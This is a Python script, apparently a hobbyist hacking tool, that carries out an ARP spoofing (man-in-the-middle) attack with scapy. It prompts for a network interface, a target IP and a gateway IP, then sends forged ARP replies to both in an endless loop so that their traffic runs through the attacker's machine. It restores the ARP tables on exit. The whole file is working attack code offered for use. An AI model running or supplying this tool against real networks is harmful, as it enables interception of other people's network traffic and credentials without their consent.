# Coded by: 29fulcrum

import scapy.all as scapy
import time
import sys
import os

arpspoofy = r"""
 █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗██╗   ██╗
██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝╚██╗ ██╔╝
███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗   ╚████╔╝ 
██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝    ╚██╔╝  
██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║        ██║   
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝        ╚═╝
"""
print(arpspoofy)

# if os.getuid != 0:
#     print("[-] Please run as root!")
#     exit()

def getMAC(ip, iface):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
  
    if answeredList:
        return answeredList[0][1].hwsrc
    else: 
        print(f"[-] No response from {ip}")
        exit()

def spoofy(targetIP, spoofIP, iface):
    targetMAC = getMAC(targetIP, iface)
    packet = scapy.Ether(dst=targetMAC) / scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP, hwsrc=scapy.get_if_hwaddr(iface))
    scapy.sendp(packet, verbose=False, iface=iface)

def restore(destinationIP, sourceIP, iface):
    destinationMAC = getMAC(destinationIP, iface)
    sourceMAC = getMAC(sourceIP, iface)
    packet = scapy.Ether(dst=destinationMAC) / scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.sendp(packet, count=4, verbose=False, iface=iface)

interfaceChoice = input("[1] eth0 / wlan0: ")

if interfaceChoice == "1":
    iface = "eth0"
elif interfaceChoice == "2":
    iface = "wlan0"
elif interfaceChoice == "eth0":
    iface = "eth0"
elif interfaceChoice == "wlan0":
    iface = "wlan0"
else:
    print("[-] Invalid choice!")
    exit()


targetIP = input("[2] Type Target IP: ")
gatewayIP = input("[3] Type Gateway IP: ")

try:
    sentPacketsCount = 0
    while True:
        spoofy(targetIP, gatewayIP, iface)
        spoofy(gatewayIP, targetIP, iface)
        sentPacketsCount = sentPacketsCount + 2
        print(f"\r[+] Packets sent: {sentPacketsCount}", end="", flush=True),
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C...... Resetting ARP tables...... Please wait.")
    restore(targetIP, gatewayIP, iface)
    restore(gatewayIP, targetIP, iface)
    print("[+] ARP tables restored.")


